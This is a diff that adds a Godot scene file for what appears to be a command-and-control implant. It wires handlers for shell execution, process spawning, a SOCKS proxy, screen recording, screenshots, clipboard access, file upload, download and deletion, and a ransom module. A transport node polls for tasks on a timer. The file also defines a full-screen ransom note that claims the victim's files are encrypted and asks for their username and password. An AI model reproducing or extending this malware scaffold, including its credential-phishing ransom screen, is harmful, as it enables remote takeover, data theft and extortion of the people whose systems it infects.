@@ -1,0 +1,304 @@
+[gd_scene load_steps=32 format=3 uid="uid://gjfuqrhyfrrh"]
+
+[ext_resource type="Script" path="res://config.gd" id="3"]
+[ext_resource type="Script" path="res://tasking.gd" id="5"]
+[ext_resource type="Script" path="res://command/cat.gd" id="6_a1d6x"]
+[ext_resource type="Script" path="res://Agent.gd" id="7"]
+[ext_resource type="Script" path="res://command/clipboard.gd" id="7_ayukj"]
+[ext_resource type="Script" path="res://command/cover.gd" id="8_q5in0"]
+[ext_resource type="Script" path="res://command/CoverGUI.gd" id="9_pyum5"]
+[ext_resource type="Script" path="res://command/cp.gd" id="10_vpc32"]
+[ext_resource type="Script" path="res://command/cwd.gd" id="11_1lkac"]
+[ext_resource type="Script" path="res://transfer.gd" id="12"]
+[ext_resource type="Script" path="res://command/exit.gd" id="12_f525o"]
+[ext_resource type="Script" path="res://command/gdscript.gd" id="12_lifin"]
+[ext_resource type="Script" path="res://command/kill.gd" id="14_irprh"]
+[ext_resource type="Script" path="res://command/ls.gd" id="15_xckvn"]
+[ext_resource type="Script" path="res://command/mv.gd" id="16_cjrxb"]
+[ext_resource type="Script" path="res://command/ransom.gd" id="17_vcpq3"]
+[ext_resource type="Script" path="res://command/RansomGUI.gd" id="18_far5m"]
+[ext_resource type="Script" path="res://command/record.gd" id="19_yddun"]
+[ext_resource type="Script" path="res://command/rm.gd" id="20_4436y"]
+[ext_resource type="Script" path="res://command/shell.gd" id="21_n78bl"]
+[ext_resource type="Script" path="res://command/sleep.gd" id="22_pvnls"]
+[ext_resource type="Script" path="res://command/spawn.gd" id="23_1h6cn"]
+[ext_resource type="Script" path="res://command/socks.gd" id="24_3ht1j"]
+[ext_resource type="Script" path="res://command/curl.gd" id="25_e4fe7"]
+[ext_resource type="Script" path="res://command/whoami.gd" id="26_rhe3q"]
+[ext_resource type="Script" path="res://transport.gd" id="27_8lipf"]
+
+[sub_resource type="FontFile" id="1"]
+fallbacks = Array[Font]([null])
+cache/0/16/0/ascent = 0.0
+cache/0/16/0/descent = 0.0
+cache/0/16/0/underline_position = 0.0
+cache/0/16/0/underline_thickness = 0.0
+cache/0/16/0/scale = 1.0
+cache/0/16/0/kerning_overrides/16/0 = Vector2(0, 0)
+
+[sub_resource type="FontFile" id="2"]
+fallbacks = Array[Font]([null])
+cache/0/16/0/ascent = 0.0
+cache/0/16/0/descent = 0.0
+cache/0/16/0/underline_position = 0.0
+cache/0/16/0/underline_thickness = 0.0
+cache/0/16/0/scale = 1.0
+cache/0/16/0/glyphs/0/advance = Vector2(0, 0)
+cache/0/16/0/glyphs/0/offset = Vector2(0, 0)
+cache/0/16/0/glyphs/0/size = Vector2(0, 0)
+cache/0/16/0/glyphs/0/uv_rect = Rect2(0, 0, 0, 0)
+cache/0/16/0/glyphs/0/texture_idx = -1
+cache/0/16/0/kerning_overrides/16/0 = Vector2(0, 0)
+
+[sub_resource type="FontFile" id="3"]
+fallbacks = Array[Font]([null])
+cache/0/16/0/ascent = 0.0
+cache/0/16/0/descent = 0.0
+cache/0/16/0/underline_position = 0.0
+cache/0/16/0/underline_thickness = 0.0
+cache/0/16/0/scale = 1.0
+cache/0/16/0/kerning_overrides/16/0 = Vector2(0, 0)
+
+[sub_resource type="FontFile" id="4"]
+fallbacks = Array[Font]([null])
+cache/0/16/0/ascent = 0.0
+cache/0/16/0/descent = 0.0
+cache/0/16/0/underline_position = 0.0
+cache/0/16/0/underline_thickness = 0.0
+cache/0/16/0/scale = 1.0
+cache/0/16/0/kerning_overrides/16/0 = Vector2(0, 0)
+
+[sub_resource type="FontFile" id="5"]
+fallbacks = Array[Font]([null])
+cache/0/16/0/ascent = 0.0
+cache/0/16/0/descent = 0.0
+cache/0/16/0/underline_position = 0.0
+cache/0/16/0/underline_thickness = 0.0
+cache/0/16/0/scale = 1.0
+cache/0/16/0/kerning_overrides/16/0 = Vector2(0, 0)
+
+[node name="Agent" type="Node"]
+script = ExtResource("7")
+
+[node name="config" type="Node" parent="."]
+script = ExtResource("3")
+
+[node name="tasking" type="Node" parent="."]
+script = ExtResource("5")
+
+[node name="cat" type="Node" parent="tasking"]
+script = ExtResource("6_a1d6x")
+
+[node name="clipboard" type="Node" parent="tasking"]
+script = ExtResource("7_ayukj")
+
+[node name="cover" type="Node" parent="tasking"]
+script = ExtResource("8_q5in0")
+
+[node name="CoverGUI" type="Node2D" parent="tasking/cover"]
+script = ExtResource("9_pyum5")
+
+[node name="ColorRect" type="ColorRect" parent="tasking/cover/CoverGUI"]
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
+size_flags_horizontal = 3
+size_flags_vertical = 3
+color = Color(0, 0, 0, 1)
+
+[node name="cp" type="Node" parent="tasking"]
+script = ExtResource("10_vpc32")
+
+[node name="curl" type="Node" parent="tasking"]
+script = ExtResource("25_e4fe7")
+
+[node name="cwd" type="Node" parent="tasking"]
+script = ExtResource("11_1lkac")
+
+[node name="exit" type="Node" parent="tasking"]
+script = ExtResource("12_f525o")
+
+[node name="gdscript" type="Node" parent="tasking"]
+script = ExtResource("12_lifin")
+
+[node name="kill" type="Node" parent="tasking"]
+script = ExtResource("14_irprh")
+
+[node name="ls" type="Node" parent="tasking"]
+script = ExtResource("15_xckvn")
+
+[node name="mv" type="Node" parent="tasking"]
+script = ExtResource("16_cjrxb")
+
+[node name="ransom" type="Node" parent="tasking"]
+script = ExtResource("17_vcpq3")
+
+[node name="RansomGUI" type="Node2D" parent="tasking/ransom"]
+script = ExtResource("18_far5m")
+
+[node name="ColorRect" type="ColorRect" parent="tasking/ransom/RansomGUI"]
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
+size_flags_horizontal = 3
+size_flags_vertical = 3
+color = Color(0.0117647, 0, 0, 1)
+
+[node name="ScreenContainer" type="HBoxContainer" parent="tasking/ransom/RansomGUI"]
+anchors_preset = 8
+anchor_left = 0.5
+anchor_top = 0.5
+anchor_right = 0.5
+anchor_bottom = 0.5
+offset_left = -456.5
+offset_top = -128.5
+offset_right = 567.5
+offset_bottom = 511.5
+grow_horizontal = 2
+grow_vertical = 2
+alignment = 1
+
+[node name="MessageContainer" type="VBoxContainer" parent="tasking/ransom/RansomGUI/ScreenContainer"]
+layout_mode = 2
+size_flags_horizontal = 4
+size_flags_vertical = 4
+alignment = 1
+
+[node name="Label" type="Label" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer"]
+layout_mode = 2
+size_flags_horizontal = 4
+theme_override_fonts/font = SubResource("1")
+text = "All your system is belong to us!"
+horizontal_alignment = 1
+uppercase = true
+
+[node name="Label2" type="Label" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer"]
+layout_mode = 2
+size_flags_horizontal = 4
+theme_override_fonts/font = SubResource("2")
+text = "
+
+
+
+
+
+
+
+
+
+
+
+
+We've isolated and encrypted key files on your system...
+While also infecting it with our control software.
+
+We will remove the infection while also restoring your files...for a cost!
+
+
+
+
+
+
+
+
+
+
+
+"
+horizontal_alignment = 1
+
+[node name="Label3" type="Label" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer"]
+layout_mode = 2
+size_flags_horizontal = 4
+theme_override_fonts/font = SubResource("3")
+text = "You must enter your username and password to continue.
+"
+horizontal_alignment = 1
+
+[node name="CredentialContainer" type="HBoxContainer" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer"]
+layout_mode = 2
+size_flags_vertical = 0
+alignment = 1
+
+[node name="UsernameInput" type="LineEdit" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer/CredentialContainer"]
+custom_minimum_size = Vector2(426, 60)
+layout_mode = 2
+theme_override_fonts/font = SubResource("4")
+placeholder_text = "Username"
+
+[node name="PasswordInput" type="LineEdit" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer/CredentialContainer"]
+custom_minimum_size = Vector2(426, 60)
+layout_mode = 2
+theme_override_fonts/font = SubResource("5")
+placeholder_text = "Password"
+
+[node name="VerifyButton" type="Button" parent="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer/CredentialContainer"]
+layout_mode = 2
+disabled = true
+text = "Verify"
+
+[node name="record" type="Node" parent="tasking"]
+script = ExtResource("19_yddun")
+
+[node name="rm" type="Node" parent="tasking"]
+script = ExtResource("20_4436y")
+
+[node name="shell" type="Node" parent="tasking"]
+script = ExtResource("21_n78bl")
+
+[node name="sleep" type="Node" parent="tasking"]
+script = ExtResource("22_pvnls")
+
+[node name="spawn" type="Node" parent="tasking"]
+script = ExtResource("23_1h6cn")
+
+[node name="socks" type="Node" parent="tasking"]
+script = ExtResource("24_3ht1j")
+
+[node name="transfer" type="Node" parent="tasking"]
+script = ExtResource("12")
+
+[node name="whoami" type="Node" parent="tasking"]
+script = ExtResource("26_rhe3q")
+
+[node name="transport" type="Node" parent="."]
+script = ExtResource("27_8lipf")
+
+[node name="CallbackTimer" type="Timer" parent="transport"]
+
+[connection signal="cat" from="tasking" to="tasking/cat" method="_on_tasking_cat"]
+[connection signal="clipboard" from="tasking" to="tasking/clipboard" method="_on_tasking_clipboard"]
+[connection signal="cover" from="tasking" to="tasking/cover" method="_on_tasking_cover"]
+[connection signal="cp" from="tasking" to="tasking/cp" method="_on_tasking_cp"]
+[connection signal="curl" from="tasking" to="tasking/curl" method="_on_tasking_curl"]
+[connection signal="cwd" from="tasking" to="tasking/cwd" method="_on_tasking_cwd"]
+[connection signal="download" from="tasking" to="tasking/transfer" method="_on_tasking_download"]
+[connection signal="download_chunk" from="tasking" to="tasking/transfer" method="_on_tasking_download_chunk"]
+[connection signal="download_start" from="tasking" to="tasking/transfer" method="_on_tasking_download_start"]
+[connection signal="exit" from="tasking" to="." method="_on_tasking_exit"]
+[connection signal="exit" from="tasking" to="tasking/exit" method="_on_tasking_exit"]
+[connection signal="gdscript" from="tasking" to="tasking/gdscript" method="_on_tasking_gdscript"]
+[connection signal="kill" from="tasking" to="tasking/kill" method="_on_tasking_kill"]
+[connection signal="ls" from="tasking" to="tasking/ls" method="_on_tasking_ls"]
+[connection signal="mv" from="tasking" to="tasking/mv" method="_on_tasking_mv"]
+[connection signal="ransom" from="tasking" to="tasking/ransom" method="_on_tasking_ransom"]
+[connection signal="record" from="tasking" to="tasking/record" method="_on_tasking_record"]
+[connection signal="rm" from="tasking" to="tasking/rm" method="_on_tasking_rm"]
+[connection signal="screenshot" from="tasking" to="tasking/transfer" method="_on_tasking_screenshot"]
+[connection signal="shell" from="tasking" to="tasking/shell" method="_on_tasking_shell"]
+[connection signal="sleep" from="tasking" to="tasking/sleep" method="_on_tasking_sleep"]
+[connection signal="socks" from="tasking" to="tasking/socks" method="_on_tasking_socks"]
+[connection signal="spawn" from="tasking" to="tasking/spawn" method="_on_tasking_spawn"]
+[connection signal="upload" from="tasking" to="tasking/transfer" method="_on_tasking_upload"]
+[connection signal="upload_chunk" from="tasking" to="tasking/transfer" method="_on_tasking_upload_chunk"]
+[connection signal="upload_start" from="tasking" to="tasking/transfer" method="_on_tasking_upload_start"]
+[connection signal="whoami" from="tasking" to="tasking/whoami" method="_on_tasking_whoami"]
+[connection signal="verify_username_password" from="tasking/ransom/RansomGUI" to="tasking/ransom" method="_on_ransom_gui_verify_username_password"]
+[connection signal="button_up" from="tasking/ransom/RansomGUI/ScreenContainer/MessageContainer/CredentialContainer/VerifyButton" to="tasking/ransom/RansomGUI" method="_on_VerifyButton_button_up"]
+[connection signal="post_response" from="transport" to="tasking" method="_on_transport_post_response"]
+[connection signal="tasking" from="transport" to="tasking" method="_on_transport_tasking"]
+[connection signal="timeout" from="transport/CallbackTimer" to="transport" method="_on_callback_timer_timeout"]
